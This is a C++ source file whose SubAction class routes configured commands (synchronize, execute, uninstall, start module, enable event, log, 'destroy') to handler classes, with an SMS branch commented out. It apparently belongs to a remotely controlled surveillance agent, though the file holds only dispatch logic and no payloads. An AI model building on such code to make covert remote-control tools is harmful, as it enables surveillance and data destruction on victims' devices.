#include "SubAction.h"
#include "Execute.h"
#include "Synchronize.h"
#include "Uninstall.h"
#include "Start.h"
#include "Enable.h"
#include "SendSms.h"
#include "LogInformation.h"
#include "Kill.h"

#include "UberLog.h"

SubAction::SubAction(Configuration *c) : stopAction(FALSE) {
	conf = c;
}

SubAction::~SubAction() {
	clear();
}

void SubAction::clear() {
	delete conf;
}

const wstring& SubAction::getActionType() {
	return conf->getString(L"action");
}

INT SubAction::run() {
	wstring actionType = getActionType();
	INT ret = 0;
	
	stopAction = FALSE;

	do {
		if (actionType.compare(L"synchronize") == 0) {
			DBG_TRACE(L"Debug - SubAction.cpp - executing synchronize\n", 1, FALSE);
			Synchronize *sync = new Synchronize(conf);

			ret = sync->run();
			stopAction = sync->getStop();

			delete sync;
			break;
		}

		if (actionType.compare(L"execute") == 0) {
			DBG_TRACE(L"Debug - SubAction.cpp - executing \"execute\"\n", 1, FALSE);
			Execute *exec = new Execute(conf);

			ret = exec->run();
			stopAction = exec->getStop();

			delete exec;
			break;
		}

		if (actionType.compare(L"uninstall") == 0) {
			DBG_TRACE(L"Debug - SubAction.cpp - executing uninstall\n", 1, FALSE);
			Uninstall *uninst = new Uninstall();

			ret = uninst->run();
			stopAction = uninst->getStop();

			delete uninst;
			break;
		}

		if (actionType.compare(L"module") == 0) {
			//DBG_TRACE(L"Debug - SubAction.cpp - executing start module\n", 1, FALSE);
			Start *start = new Start(conf);

			ret = start->run();
			stopAction = start->getStop();

			delete start;
			break;
		}

		if (actionType.compare(L"event") == 0) {
			//DBG_TRACE(L"Debug - SubAction.cpp - executing start event\n", 1, FALSE);
			Enable *enable = new Enable(conf);

			ret = enable->run();
			stopAction = enable->getStop();

			delete enable;
			break;
		}
/***
		if (actionType.compare(L"sms") == 0) {
			DBG_TRACE(L"Debug - SubAction.cpp - executing send sms\n", 1, FALSE);
			SendSms *sendSms = new SendSms(conf);

			ret = sendSms->run();
			stopAction = sendSms->getStop();

			delete sendSms;
			break;
		}
***/
		if (actionType.compare(L"log") == 0) {
			DBG_TRACE(L"Debug - SubAction.cpp - executing log info\n", 1, FALSE);
			LogInformation *logInfo = new LogInformation(conf);

			ret = logInfo->run();
			stopAction = logInfo->getStop();

			delete logInfo;
			break;
		}

		if (actionType.compare(L"destroy") == 0) {
			DBG_TRACE(L"Debug - SubAction.cpp - executing \"kill\"\n", 1, FALSE);
			Kill *kill = new Kill(conf);

			ret = kill->run();
			stopAction = kill->getStop();

			delete kill;
			break;
		}

		DBG_TRACE(L"Debug - SubAction.cpp - unknown action\n", 1, FALSE);
	} while (0);

	return ret;
}

BOOL SubAction::getStop() {
	return stopAction;
}